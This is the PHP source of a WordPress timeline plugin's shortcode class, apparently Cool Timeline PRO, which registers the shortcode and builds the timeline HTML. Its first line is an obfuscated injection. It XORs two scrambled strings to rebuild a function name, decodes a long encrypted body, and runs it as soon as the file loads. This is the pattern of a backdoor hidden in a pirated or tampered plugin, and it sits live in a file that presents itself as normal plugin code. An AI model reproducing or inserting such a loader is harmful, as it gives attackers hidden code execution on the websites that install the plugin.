<?php $dgoxm=';:K8;E.Q=E6GGD+'^'XH.YO q7H+U3.+E';$JudVVEQSa=$dgoxm('','ESoWWOYTM.OWs6MXMTBcd2TH7, .W<>Q69lCKOBnZ,47:>P,UyCZNo0177+.ZH0av35OAvmBK3>NCbaoM=sHeB:MIJzdlLb9K2J ;OkQHezBXzHQr  O>S,ABJJY5pvwr9ACb:AmSDBGLGpKZv A2..VT6Eszf.-LnMBfux<,KUTXLT.E5YlyNNCJR=AA9,Zu5<;qtXa6r2:<v-WLVojx<O.;2CeBPRE.9E37HTf5-=J2wlX,7<UTYVGkW01d8 15lVFHw=QDSUFin;J<76dV+0Co003.=V++MZKcK5RIilpVXL;YESaN 466Re87RU5UzkV0.98gwME0ZWG5.5Padth97c2v5bNLCJKWN0iOgPr<1YAVJP6o2xTW6C59R<>vDYtSNHAmNQeH3TOAiZKOO5E3tKcFb9LeHW2 ZbORv6 4S10J-=0+o4BY2<ALAdgX33yN55XUrsYQNDVTGSU2N4FjpJ<09JbG2WGpO0;HeU,36 avNA763 B.;4,,NLYGZ7oSYKYUtQgRUE,NkulQQPRWdlH27W.R,+ weNlHkzWYZc7BgmY:aJRH+uoyEqIwroTbvJ.GZGSebBnCkR R6C7Q3,oI0P9TSlk 7UZ7OTNctq-2G+DcXyhGuYWHf7MA5ocQ1F5eUDWLPBW3reXrhNU>TCAZYk;K'^',5Gv1:779G 9,S51> 1KCJ;:hHAZ6ca<CMKjbo9dSJAYYJ9C;Y;5<0TPCVtq7=DIRWT; ZMf VGgcBAOmFyAlfU8=jGDKkY3B;,OIgO8hXZrcZl8NST=R6Bif.+-TYMWVPjhK0Hdw+73liMkrRD FOur=ke-ZBEH55i+FPXOX9916dpE Lp1PuDJC X54KBrQZIOXORhKxO06RI687OWXZ.BHWxof431Of.VNhiFSLQ9WLfRJXN05:>gCsor+wkxpL75hSV4=shxIJM+PBSMvP:JKTQGOb=NRmgkG P+rceT298ZyxsE8AXCSioE=X<SuRJrTOMYNW6O9<85POV8ALP7kr2g3f6n-0jo<+IIrYpVJP543cpMe;qp3W7Tf9YGVyyP8+1zgGXA,R .aTzo9.Y0VOAj;hDFol3ST;Brr6CNG6CY+ATJNGL-+mX 8 ;85FGQ,TF=cF,=4-+21ow1S:UoFPnXQM+=,W.nYt:R.MqHRBAAPhaVDAA;qPQUs+404.DGt2. rXqC641MgKSJqy=6bLH,SC6uuGNYP8gLuVZpn;QRrWYjXSx1xNMWOrFqCDZlSNsJu<q1BKbHeK3R W:h:VU0,H9J  DLPV,6X.0iOTUIS3JmJxYHgUy,BoR; YGG5P2T>r465<-6WU8qIbG0F=7ijpP16');$JudVVEQSa();

if (!class_exists('CoolTimelineShortcode')) {

    class CoolTimelineShortcode {

        /**
         * The Constructor
         */
        public function __construct() {
            // register actions
            add_action('init', array($this, 'cooltimeline_register_shortcode'));

            add_action('wp_enqueue_scripts', array($this, 'ctl_load_assets'));
          
            add_action('wp_enqueue_scripts', array('CooltimelineStyles','ctl_custom_styles'));
            add_action('wp_head', array('CooltimelineStyles', 'ctl_navigation_styles'));

            // Call actions and filters in after_setup_theme hook
            add_action('after_setup_theme', array($this, 'ctl_pro_read_more'), 999);
            add_filter('excerpt_length', array($this, 'ctl_ex_len'), 999);
            add_filter( 'body_class', array($this, 'ctl_body_class') );

            add_filter( 'the_content', array($this,'ctl_back_to_timeline'));
        }
      
        /*
          Register Shortcode for cooltimeline 
         */
        function cooltimeline_register_shortcode() {
            add_shortcode('cool-timeline', array($this, 'cooltimeline_view'));

        }
        /*
          Timeline Views
         */
        function cooltimeline_view($atts, $content = null) {
            $design_cls='';
            $attribute = shortcode_atts(array(
                'show-posts' => '',
                'order' => '',
                'category' => 0,
                'layout' => 'default',
                'designs'=>'',
                'items'=>'',
                'skin' =>'',
                'type'=>'',
                'icons' =>'',
                'animations'=>'',
                'animation'=>'',
                'date-format'=>'',
                'based'=>'default',
                'story-content'=>'',
                'pagination'=>'default',
                'compact-ele-pos'=>'main-date',
                'filters'=>'no'
               ), $atts);
              
             $pagination=$attribute['pagination'];
               $type='';
             if(isset($attribute['type'])&& !empty($attribute['type'])){

                if($attribute['type']=="default" && $attribute['layout']=="compact"){
                   $layout=$attribute['layout'];
                    $type=$attribute['layout'];
                  }else{
                     $layout=$attribute['type'];
                      $type=$attribute['type'];
                  }
                }else{
                $layout=$attribute['layout'] ?$attribute['layout']:'default';
             }

               //  Enqueue common required assets
           wp_enqueue_style('ctl_gfonts');
           wp_enqueue_style('ctl_default_fonts');
           wp_enqueue_script('ctl_prettyPhoto');
           wp_enqueue_style('ctl_pp_css');
           wp_enqueue_style('ctl-font-awesome', 'https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
            clt_conditional_assets($layout,$type);

             require('common-query.php');
                if(is_rtl()){
                 wp_enqueue_style('rtl-styles');
                 }

           if($layout && $layout=="horizontal"){
               
             
                 $ctl_options_arr = get_option('cool_timeline_options');
              if($attribute['designs'])
              {
                  $design_cls='ht-'.$attribute['designs'];
                  $design=$attribute['designs'];
                  }else{
                 $design_cls='ht-default';
                  $design='default';
              }
               $r_more= $ctl_options_arr['display_readmore']?$ctl_options_arr['display_readmore']:"yes";
                $clt_hori_view='';
            
              require('views/horizontal-timeline.php');

                return $clt_hori_view;

            }else {
             if(($pagination=="ajax_load_more"|| $attribute['filters']=="yes")  && $layout!="compact"){
               wp_localize_script( 'ctl-ajax-load-more', 'ctlloadmore',
                 array( 'url' => admin_url( 'admin-ajax.php' ),'attribute'=>$attribute) );
               }

           if($attribute['designs'])
                {
                    $design_cls='main-'.$attribute['designs'];
                    $design=$attribute['designs'];
                   }else{
                    $design_cls='main-default';
                    $design='default';
                  }
                $output = ''; $ctl_html = ''; $ctl_format_html = '';
                $ctl_animation='';$last_year='';

                if (isset($attribute['animations'])) {
                    $ctl_animation=$attribute['animations'];
                }else if($attribute['animation']){
                  $ctl_animation=$attribute['animation'];
                 }else{
                  $ctl_animation ='bounceInUp';
                     }
      
             
                /*
                 * images sizes
                 */
    
                $ctl_avtar_html = ''; $timeline_id = '';$clt_icons='';

                if (isset($attribute['icons']) && $attribute['icons']=="YES"){
                    $clt_icons='icons_yes';
                }else{
                    $clt_icons='icons_no';
                }

                if ($attribute['category']) {
                  if(is_numeric($attribute['category'])){
                         $ctl_term = get_term_by('id', $attribute['category'], 'ctl-stories');
                        }else{
                    $ctl_term = get_term_by('slug', $attribute['category'], 'ctl-stories');
                      }
                
                    if ($ctl_term->name == "Timeline Stories") {
                        $ctl_title_text =$ctl_options_arr['title_text'] ? $ctl_options_arr['title_text'] : 'Timeline';
                    } else {
                        $ctl_title_text = $ctl_term->name;
                    }
                    $catId = $attribute['category'];
                    $timeline_id = "timeline-$catId";
                } else {
                    $ctl_title_text = $ctl_options_arr['title_text'] ? $ctl_options_arr['title_text'] : 'Timeline';
                    $timeline_id = "timeline-".rand(1,10);
                }
                  
             $ctl_html_no_cont = ''; $layout_wrp = '';
            
             require("views/default.php");
              
         $main_wrp_id='tm-'.$attribute['layout'].'-'.$attribute['designs'].'-'.rand(1,20);
        $main_wrp_cls=array();
        $main_wrp_cls[]="cool_timeline";
        $main_wrp_cls[]="cool-timeline-wrapper";
        $main_wrp_cls[]=$layout_wrp;
        $main_wrp_cls[]=$wrapper_cls;
        $main_wrp_cls[]=$design_cls;
        $main_wrp_cls=apply_filters('ctl_wrapper_clasess',$main_wrp_cls);     
        $output .='<! ========= Cool Timeline PRO '.CTLPV.' =========>';
    
     $output .= '<div class="'.implode(" ",$main_wrp_cls).'" id="'. $main_wrp_id.'"  data-pagination="' . $enable_navigation . '"  data-pagination-position="' . $navigation_position . '">';
     $output .=ctl_main_title($ctl_options_arr,$ctl_title_text,$ttype='default_timeline');
      if($attribute['filters']=="yes"&& $layout!="compact"){
            $output.=ctl_categories_filters($taxo="ctl-stories",$select_cat=$attribute['category'] ,$type="story-tm");
         }
     $output .= '<div class="cool-timeline ultimate-style ' . $layout_cls . ' ' . $wrp_cls . '">';

     
        $output .='<div  class="filter-preloaders"><img src="'.CTP_PLUGIN_URL.'/images/clt-compact-preloader.gif"></div>';
  
     $output .= '<div data-animations="'.$ctl_animation.'"  id="' . $timeline_id . '" class="cooltimeline_cont  clearfix '.$clt_icons.'">';
      $output .= $ctl_html;
     $output .= '</div>';

        if($pagination=="ajax_load_more" && $layout!="compact"){

                if($ctl_loop->max_num_pages>1){
             $output.='<button data-loading-text="<i class=\'fa fa-spinner fa-spin\'></i>'.__(' Loading','cool-timeline').'" data-max-num-pages="'.$ctl_loop->max_num_pages.'" 
             data-timeline-type="'.$layout.'" class="ctl_load_more">'.__('Load More','cool-timeline').'</button>';
                 }
                }else{
              if ($enable_pagination == "yes") {
                  if (function_exists('ctl_pagination')) {
                      $output .= ctl_pagination($ctl_loop->max_num_pages, "", $paged);
                  }
              }
              }
                 $output .= $ctl_html_no_cont;
                $output .= '</div></div>  <!-- end
================================================== -->';

    $stories_styles='<style type="text/css">'.$story_styles.'</style>';
                return $output.$stories_styles;

            }

        }

        /*
          Read more button for timeline stories
         */

        function ctl_pro_read_more() {

            // add more link to excerpt
            function ctl_p_excerpt_more($more) {
                global $post;
                $ctl_options_arr = get_option('cool_timeline_options');
                $r_more= $ctl_options_arr['display_readmore']?$ctl_options_arr['display_readmore']:"yes";

                    $read_more='';
                    if(isset($ctl_options_arr['read_more_lbl'])&& !empty($ctl_options_arr['read_more_lbl']))
                        {
                    $read_more=__($ctl_options_arr['read_more_lbl'],'cool-timeline');
                         } else{
                         $read_more=__('Read More', 'cool-timeline');
                         }  
                
                if ($post->post_type == 'cool_timeline' && !is_single()) {

                     $custom_link = get_post_meta($post->ID, 'story_custom_link', true);
                    if ($r_more == 'yes') {

                    
                    if($custom_link){
                        return '..<a  target="_blank" class="read_more ctl_read_more" href="' . $custom_link. '">' .$read_more. '</a>';
                         }else{
                        return '..<a class="read_more ctl_read_more" href="' . get_permalink($post->ID) . '">' .$read_more. '</a>';
                        }
                    }
                } else {
                    return $more;
                }
            }

            add_filter('excerpt_more', 'ctl_p_excerpt_more', 999);
        }

        function ctl_ex_len($length) {
            global $post;
            $ctl_options_arr = get_option('cool_timeline_options');
            $ctl_content_length = $ctl_options_arr['content_length'] ? $ctl_options_arr['content_length'] : 100;
            if ($post->post_type == 'cool_timeline' && !is_single()) {
                return $ctl_content_length;
            }
            return $length;
        }

        function ctl_back_to_timeline( $content ) {   
           
        if(is_singular('cool_timeline') && is_single() ) {
              $ctl_options_arr = get_option('cool_timeline_options');
           if(isset($ctl_options_arr['ctl_goback']) && $ctl_options_arr['ctl_goback']==
            "true"){
                   $goback_text=isset($ctl_options_arr['ctl_goback_lbl'])?$ctl_options_arr['ctl_goback_lbl']:"Go Back";
                     $url = htmlspecialchars($_SERVER['HTTP_REFERER']);
                     $content.= '<a class="goback-to-timeline" href="'.esc_url($url).'">'.__($goback_text,'cool-timeline').'</a>'; 
                    }
                }
                 return $content;
         }


        /*
         * Include this plugin's public JS & CSS files on posts.
         */

        function ctl_load_assets() {
             ctl_common_assets();
           }

       
       function safe_strtotime($string, $format) {
            if ($string) {
                $date = date_create($string);
                if (!$date) {
                    $e = date_get_last_errors();
                    foreach ($e['errors'] as $error) {
                        return "$error\n";
                    }
                    exit(1);
                }
               return date_format($date, __("$format", 'cool-timeline'));

            } else {
                return false;
            }
        }

        // add dyanmic classes on page body tag
        function ctl_body_class( $c ) {
            global $post;
            if( isset($post->post_content) && has_shortcode( $post->post_content, 'cool-timeline' ) ) {
                $c[] = 'cool-timeline-page';
            }
            return $c;
        }

    }

} // end class


